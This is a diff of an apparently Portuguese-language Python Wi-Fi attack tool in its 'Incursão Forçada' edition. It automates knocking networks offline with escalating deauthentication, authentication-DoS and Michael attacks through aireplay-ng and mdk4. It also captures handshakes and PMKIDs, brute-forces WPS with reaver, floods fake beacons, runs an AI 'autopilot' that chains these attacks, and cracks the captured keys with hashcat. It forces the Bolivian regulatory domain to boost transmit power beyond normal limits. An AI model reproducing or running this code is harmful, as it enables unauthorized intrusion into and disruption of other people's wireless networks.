@@ -7,7 +7,7 @@ import threading
 from datetime import datetime
 
 # ==============================================================
-# UI MODERNA - GRÃO-MESTRE SUPREMO (RADAR TURBO EDITION)
+# UI MODERNA - GRÃO-MESTRE SUPREMO (INCURSÃO FORÇADA EDITION)
 # ==============================================================
 try:
     from rich.console import Console
@@ -18,11 +18,12 @@ try:
     from rich.text import Text
     from rich import print as rprint
 except ImportError:
-    print("[!] Erro: Dependências rich ausentes.")
+    print("[!] Erro: rich ausente.")
     exit(1)
 
 console = Console()
 WEB_CALLBACK = None
+AUTOPILOT_ACTIVE = False
 
 def supreme_log(msg, log_type="info"):
     if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
@@ -35,9 +36,8 @@ OUI_DB = {
     "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
     "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
     "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
-    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
-    "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
-    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "FC:22:F4": "Zyxel"
+    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "00:0C:42": "MikroTik",
+    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras"
 }
 
 def identify_vendor(bssid):
@@ -46,32 +46,35 @@ def identify_vendor(bssid):
 
 def analyze_vulnerabilities(vendor, essid, privacy):
     vulns, advice = [], ""
+    injection_works = os.path.exists("/tmp/dsi_injection_ok")
     if "Starlink" in vendor or "Starlink" in essid:
-        advice = "ALVO NÍVEL 10 (STARLINK). Varredura em 5GHz necessária. Use MODO AUTOPILOTO."
-        vulns.append("PMF (802.11w)")
-    else: advice = "Alvo mapeado. Varrendo vulnerabilidades..."
+        advice = "ALVO BLINDADO. Use Vetor D (Fantasma) para instabilidade ou Vetor X."
+    elif not injection_works:
+        advice = "HARDWARE LIMITADO. Deauth falhará. Use Vetor A (PMKID) ou Vetor F (Evil Twin)."
+    else: advice = "Alvo vulnerável a Incursão Forçada."
     return vulns, advice
 
 def test_injection(interface):
     run_command("rm -f /tmp/dsi_injection_ok")
-    supreme_log(f"Testando injeção em {interface}...", log_type="cmd")
+    supreme_log(f"Calibrando Injeção em {interface}...", log_type="cmd")
+    run_command(f"iw dev {interface} set channel 6", sudo=True)
+    time.sleep(1)
     stdout, _ = run_command(f"aireplay-ng -9 {interface}")
     if stdout and "Injection is working!" in stdout:
-        supreme_log("HARDWARE VALIDADO PARA COMBATE.")
+        supreme_log("HARDWARE VALIDADO PARA ATAQUE ATIVO.", log_type="info")
         with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
         return True
     supreme_log("HARDWARE LIMITADO: Injeção falhou.", log_type="error")
     return False
 
 def boost_signal(interface):
-    supreme_log(f"Amplificando rádio em {interface} (Aumento de Ganho)...", log_type="cmd")
     run_command("iw reg set BO", sudo=True)
     run_command(f"ip link set {interface} down", sudo=True)
     run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
 
 def fix_drivers_wifi6(auto_confirm=False):
-    supreme_log("Diagnóstico Wi-Fi 6 acionado.", log_type="cmd")
+    supreme_log("Wi-Fi 6 Doctor acionado.", log_type="cmd")
     stdout_usb, _ = run_command("lsusb")
     chipset = None
     if "8852" in stdout_usb: chipset = "RTL8852AU"
@@ -126,8 +129,22 @@ def set_managed_mode(interface):
     run_command(f"macchanger -p {interface}", sudo=True)
     run_command(f"iw dev {interface} set type managed", sudo=True)
     run_command(f"ip link set {interface} up", sudo=True)
-    run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
+    run_command("systemctl start NetworkManager", sudo=True)
     run_command("nmcli networking on", sudo=True)
+
+def capture_vetor_x(monitor_interface, bssid, channel, output_file, params=None):
+    pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
+    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
+    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
+    try:
+        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        time.sleep(120); proc.terminate()
+    except: pass
+    if os.path.exists(pcapng):
+        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
+        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
+    return None
 
 def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
@@ -135,12 +152,10 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     filtro = "alvo_filtro.txt"
     with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
-    intensity = params.get('intensity', 15) if params else 15
-    timeout = params.get('timeout', 60) if params else 60
-    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status={intensity}"
+    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
     try:
         proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        time.sleep(timeout); proc.terminate()
+        time.sleep(60); proc.terminate()
     except: pass
     os.remove(filtro)
     if os.path.exists(pcapng):
@@ -149,38 +164,43 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
     return None
 
 def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
+    supreme_log(f"DERRUBANDO REDE {bssid} PARA CAPTURA DE HANDSHAKE...", log_type="cmd")
     os.system(f"rm -f {output_file}-01.*")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
     dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     cap_file = f"{output_file}-01.cap"; handshake_found = False
-    timeout = params.get('timeout', 30) if params else 30
-    for attempt in range(1, 4):
-        deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
+    
+    # Vetores de Derrubada Escalonados
+    for attempt in range(1, 5):
+        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} {monitor_interface}"; supreme_log("Aireplay: Injetando 20 Deauth...")
+        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"; supreme_log("MDK4: Flood de Desautenticação (Derrubada Massiva)...")
+        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"; supreme_log("MDK4: DoS de Autenticação (Congelando o Roteador)...")
+        else: deauth_cmd = f"sudo mdk4 {monitor_interface} m -t {bssid}"; supreme_log("MDK4: Ataque Michael (Forçando Erros de TKIP)...")
+        
         deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for _ in range(timeout):
+        for _ in range(45):
             time.sleep(1)
             if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                 stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                 if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
         deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
-        if handshake_found: break
+        if handshake_found: supreme_log("SUCESSO: Handshake capturado!"); break
+    
     dump_proc.terminate(); return cap_file if handshake_found else None
 
-def capture_wps(monitor_interface, bssid, channel, params=None):
-    timeout = params.get('timeout', 120) if params else 120
+def capture_wps(monitor_interface, bssid, channel):
     cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
     try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
         return "WPS PIN" in res.stdout
     except: return False
 
-def start_ghost_attack(interface, essid, params=None):
-    timeout = params.get('timeout', 30) if params else 30
+def start_ghost_attack(interface, essid):
     cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
     try:
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(timeout); proc.terminate()
+        time.sleep(45); proc.terminate()
     except: pass
 
 def start_wifite_expert(interface):
@@ -189,19 +209,14 @@ def start_wifite_expert(interface):
     except: pass
 
 def start_evil_twin(interface, essid):
-    supreme_log("Evil Twin acionado.")
+    supreme_log("Iniciando Módulo Evil Twin...")
 
 def scan_networks(monitor_interface):
     boost_signal(monitor_interface)
-    supreme_log("Iniciando Radar Turbo Dual-Band (2.4/5/6GHz)...", log_type="cmd")
     output_prefix = "scan_results"
     run_command(f"rm -f {output_prefix}-01.*")
-    
-    # RADAR TURBO: Escaneia todas as frequências com atualização de 1s e identificação de fabricante
-    cmd = f"sudo airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {output_prefix} {monitor_interface}"
-    try: subprocess.run(cmd, shell=True)
+    try: subprocess.run(f"sudo airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
     except KeyboardInterrupt: pass
-    
     networks = []
     csv_file = f"{output_prefix}-01.csv"
     if os.path.exists(csv_file):
@@ -212,15 +227,29 @@ def scan_networks(monitor_interface):
                 if row[0].strip() == "BSSID": in_ap = True; continue
                 if in_ap and not row[0].strip() == "Station MAC":
                     bssid = row[0].strip(); essid = row[13].strip()
-                    # Inclui redes ocultas
                     name = essid if (essid and essid != "\x00") else f"<Oculta: {bssid[-5:]}>"
-                    networks.append({
-                        'bssid': bssid, 'channel': row[3].strip(), 
-                        'privacy': row[5].strip(), 'essid': name, 
-                        'vendor': identify_vendor(bssid), 'signal': row[8].strip()
-                    })
+                    networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': name, 'vendor': identify_vendor(bssid), 'signal': row[8].strip()})
                 elif row[0].strip() == "Station MAC": break
     return networks
+
+def run_autopilot(interface, target):
+    from dsi_ai import DSIAI
+    brain = DSIAI()
+    prefix = f"capture_{target['essid']}"
+    hw_ok = os.path.exists("/tmp/dsi_injection_ok")
+    for attempt in range(5):
+        attack_type, params = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
+        supreme_log(f"Autopiloto Ciclo {attempt+1}: {attack_type.upper()}")
+        cap = None
+        if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
+        elif attack_type == 'wps':
+            if capture_wps(interface, target['bssid'], target['channel'], params): return "WPS_SUCCESS"
+        elif attack_type == 'ghost':
+            start_ghost_attack(interface, target['essid']); continue
+        if cap: return cap
+    return None
 
 def main():
     if os.geteuid() != 0: return
@@ -232,9 +261,15 @@ def main():
         finally: set_managed_mode(mon)
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
+    if hash_file == "WPS_SUCCESS": return
     if not os.path.exists(wordlist_file): return
     cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
-    try: subprocess.run(cmd, shell=True)
-    except: pass
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        if "KEY FOUND" in res.stdout:
+            supreme_log("SENHA QUEBRADA!", log_type="cmd")
+            return True
+        return False
+    except: return False
 
 if __name__ == "__main__": main()
